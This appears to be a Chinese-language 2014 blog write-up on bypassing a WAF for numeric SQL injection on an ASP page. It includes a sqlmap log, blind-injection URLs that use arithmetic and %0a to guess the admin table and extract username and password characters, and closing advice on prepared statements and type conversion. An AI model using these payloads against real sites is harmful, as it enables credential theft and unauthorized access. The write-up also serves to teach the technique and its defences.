Title: 使用运算符绕过WAF进行SQL注入
Date: 2014-07-04 06:22
Tags: SQL注入


此网站部署了一个简单的防注入程序，使用sqlmap和pangoli都测试过，无法注入，sqlmap测试结果如下。怎么能绕过呢，注入点属于一个数字型的，突然想到是否可以使用运算符绕过呢？

> ...

> [06:00:06] [INFO] testing 'Oracle inline queries'

> [06:00:06] [INFO] testing 'SQLite inline queries'

> [06:00:07] [INFO] testing 'MySQL > 5.0.11 stacked queries'

> [06:00:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries'

> [06:00:08] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'

> [06:00:09] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'

> [06:00:10] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'

> [06:00:11] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'

> [06:00:11] [INFO] testing 'Oracle AND time-based blind'

> [06:00:12] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'

> [06:00:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'

> [06:00:20] [WARNING] using unescaped version of the test because of zero knowled

> ge of the back-end DBMS. You can try to explicitly set it using option '--dbms'

> [06:00:29] [WARNING] GET parameter 'ID' is not injectable

> [06:00:29] [CRITICAL] all tested parameters appear to be not injectable. Try to

> increase '--level'/'--risk' values to perform more tests. As heuristic test turn

> ed out positive you are strongly advised to continue on with the tests. Please,

> consider usage of tampering scripts as your target might filter the queries. Als

> o, you can try to rerun by providing either a valid value for option '--string'

> (or '--regexp')

> [*] shutting down at 06:00:29


#### **1、漏洞验证**

1.使用单引号，返回waf拦截信息，返回页面信息如下

![ALT TEXT](/static/images/add-injection-1.gif)


2.正常页面，返回页面信息如下

![ALT TEXT](/static/images/add-injection-2.gif)

3.使用运算符，返回页面信息如下，可以看出与正常页面返回信息不一样，因此可以判断存在数字型注入，工具是无能为力了，只能盲注

![ALT TEXT](/static/images/add-injection-3.gif)


#### **2、盲注方法**

1.猜表

    http://www.xxxxxx.com/kssz.asp?ID=1125-((select%0acount(*)%0afrom%0aadmin)>0)

2.猜字段

    http://www.xxxxxx.com/kssz.asp?ID=1125-((select%0acount(username)%0afrom%0aadmin)>0)
    http://www.xxxxxx.com/kssz.asp?ID=1125-((select%0acount(password)%0afrom%0aadmin)>0)

3.猜表中数据

猜长度

    http://www.xxxxxx.com/kssz.asp?ID=1125-((select%0atop%0a1%0alen(username)%0afrom%0aadmin)>0)
    http://www.xxxxxx.com/kssz.asp?ID=1125-((select%0atop%0a1%0alen(password)%0afrom%0aadmin)>0)

猜内容

    http://www.xxxxxx.com/kssz.asp?ID=1125-((select%0atop%0a1%0aAsc(mid(username,1,1))%0afrom%0aadmin)>49)
    http://www.xxxxxx.com/kssz.asp?ID=1125-((select%0atop%0a1%0aAsc(mid(password,1,1))%0afrom%0aadmin)>49)

#### **3、修复方法**

防注入不能依靠外部的WAF程序就可以高枕无忧了，WAF程序不是万能的，还是得从网站本身的代码出发，才能彻底解决，一般方法如下

1.使用预编译的方法，防止sql语法结构由于用户输入而改变

2.针对数字型的注入其实很简单，做一次数据转换即可

3.针对字符型的过滤时需要考虑问题很多，建议采用已成熟的算法


